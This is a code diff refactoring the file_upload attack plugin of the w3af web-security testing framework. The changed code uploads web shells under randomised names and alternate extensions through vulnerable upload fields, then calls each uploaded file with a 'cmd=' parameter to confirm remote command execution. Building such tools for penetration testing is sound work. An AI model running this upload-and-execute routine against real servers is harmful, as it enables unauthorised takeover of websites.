@@ -20,14 +20,13 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 """
 import os.path
-import tempfile
 
 import w3af.core.controllers.output_manager as om
 import w3af.plugins.attack.payloads.shell_handler as shell_handler
 
 from w3af.core.data.kb.exec_shell import ExecShell
+from w3af.core.data.fuzzer.utils import rand_alpha
 from w3af.core.controllers.exceptions import BaseFrameworkException
-from w3af.core.controllers.misc.temp_dir import get_temp_dir
 from w3af.core.controllers.plugins.attack_plugin import AttackPlugin
 from w3af.core.controllers.misc.io import NamedStringIO
 from w3af.plugins.attack.payloads.decorators.exec_decorator import exec_debug
@@ -83,71 +82,66 @@ class file_upload(AttackPlugin):
         :param vuln_obj: The vuln to exploit.
         :return : True if vuln can be exploited.
         """
-        # The vuln was saved to the kb as a vuln object
+        if not 'file_vars' in vuln_obj:
+            return False
+
         url = vuln_obj.get_url()
-        method = vuln_obj.get_method()
-        exploit_dc = vuln_obj.get_dc()
-
-        # Create a file that will be uploaded
         extension = url.get_extension()
-        path, file_name = self._create_file(extension)
-        file_content = open(os.path.join(path, file_name), "r").read()
-        file_handler = NamedStringIO(file_content, file_name)
-        
-        #   If there are files,
-        if 'file_vars' in vuln_obj:
-            #
-            #   Upload the file
-            #
-            for file_var_name in vuln_obj['file_vars']:
-                # the [0] was added here to support repeated parameter names
-                exploit_dc[file_var_name][0] = file_handler
-            http_method = getattr(self._uri_opener, method)
-            response = http_method(vuln_obj.get_url(), exploit_dc)
 
-            # Call the uploaded script with an empty value in cmd parameter
-            # this will return the shell_handler.SHELL_IDENTIFIER if success
-            dst = vuln_obj['file_dest']
-            self._exploit = dst.get_domain_path().url_join(file_name)
-            self._exploit.querystring = u'cmd='
-            response = self._uri_opener.GET(self._exploit)
-
-            # Clean-up
-            file_handler.close()
-            os.remove(os.path.join(path, file_name))
-
-            if shell_handler.SHELL_IDENTIFIER in response.get_body():
+        for file_content, file_name in self._get_web_shells(extension):
+            if self._upload_shell_and_confirm_exec(vuln_obj, file_content, file_name):
                 return True
 
         #   If we got here, there is nothing positive to report
         return False
 
-    def _create_file(self, extension):
+    def _upload_shell_and_confirm_exec(self, vuln_obj, file_content, file_name):
         """
-        Create a file with a webshell as content.
-
-        :return: Name of the file that was created.
+        :return: True if we were able to upload and the remote server actually
+                 executes the remote file.
         """
-        # Get content
-        ws = shell_handler.get_webshells(extension, force_extension=True)[0]
-        file_content, real_extension = ws
+        # The vuln was saved to the kb as a vuln object
+        method = vuln_obj.get_method()
+        exploit_dc = vuln_obj.get_dc()
 
-        if extension == '':
-            extension = real_extension
+        # Create a file that will be uploaded
+        file_handler = NamedStringIO(file_content, file_name)
 
-        # Open target
-        temp_dir = get_temp_dir()
-        low_level_fd, path_name = tempfile.mkstemp(prefix='w3af_',
-                                                   suffix='.' + extension,
-                                                   dir=temp_dir)
-        file_handler = os.fdopen(low_level_fd, "w+b")
+        for file_var_name in vuln_obj['file_vars']:
+            # the [0] was added here to support repeated parameter names
+            exploit_dc[file_var_name][0] = file_handler
 
-        # Write content to target
-        file_handler.write(file_content)
-        file_handler.close()
+        # Upload the file
+        http_method = getattr(self._uri_opener, method)
+        http_method(vuln_obj.get_url(), exploit_dc)
 
-        path, file_name = os.path.split(path_name)
-        return path, file_name
+        # Call the uploaded script with an empty value in cmd parameter
+        # this will return the shell_handler.SHELL_IDENTIFIER if success
+        dst = vuln_obj['file_dest']
+        self._exploit = dst.get_domain_path().url_join(file_name)
+        self._exploit.querystring = u'cmd='
+        response = self._uri_opener.GET(self._exploit)
+
+        if shell_handler.SHELL_IDENTIFIER in response.get_body():
+            return True
+
+        return False
+
+    def _get_web_shells(self, extension):
+        """
+        :yield: Tuples with file_content and file_name for web shells.
+        """
+        for shell_str, orig_extension in shell_handler.get_webshells(extension):
+            # If the webshell was webshell.php this will return a file_name
+            # containing kgiwjxh.php (8 rand and the extension)
+            file_name = '%s.%s' % (rand_alpha(8), orig_extension)
+            yield shell_str, file_name
+
+            # Now we want to return the webshell content <?php ... ?> but in a
+            # file with the extension that the upload URL had. This makes our
+            # chances of getting access a little greater
+            file_name = '%s.%s' % (rand_alpha(8), extension)
+            yield shell_str, file_name
 
     def get_root_probability(self):
         """
